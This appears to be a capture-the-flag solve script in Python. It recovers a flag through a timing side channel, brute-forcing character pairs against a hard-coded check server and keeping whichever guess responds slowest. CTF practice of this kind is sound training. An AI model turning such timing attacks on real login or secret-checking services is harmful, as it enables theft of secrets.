#!/usr/bin/env python
import requests as rq
import sys
import itertools

ALPHABET = "13457unsdchr_"


def parse_out(r):
    line = r.text.split('\n')
    status = line[0]
    time_ms = int(line[1].split(': ')[1][:-2])
    return status, time_ms


def get_max(letters, times):
    assert len(letters) == len(times)
    return letters[times.index(max(times))]


def main():
    flag = "ping{s1d3_ch4nn"
    ch_count = 6
    global_cnt = 0
    while True:
        time_l = []
        letter_l = []
        for chs_t in itertools.permutations(ALPHABET, 2):
            chs = ''.join(chs_t)
            new_f = flag + chs
            if global_cnt % 5 == 0:
                print(f'Trying {chs} current flag {flag}')
                sys.stdout.flush()
            r = rq.get(f'http://91.107.202.115:20420/check?flag={new_f}')
            stat, tm = parse_out(r)
            letter_l.append(chs)
            time_l.append(tm)
            if 'Correct' in stat:
                print(f'GOT FLAG {flag}')
            global_cnt += 1
        win_ch = get_max(letter_l, time_l)
        flag += win_ch[0]
        print(f'{win_ch[0]} {ch_count=} {list(zip(letter_l, time_l))}')
        sys.stdout.flush()
        ch_count += 1


if __name__ == '__main__':
    main()
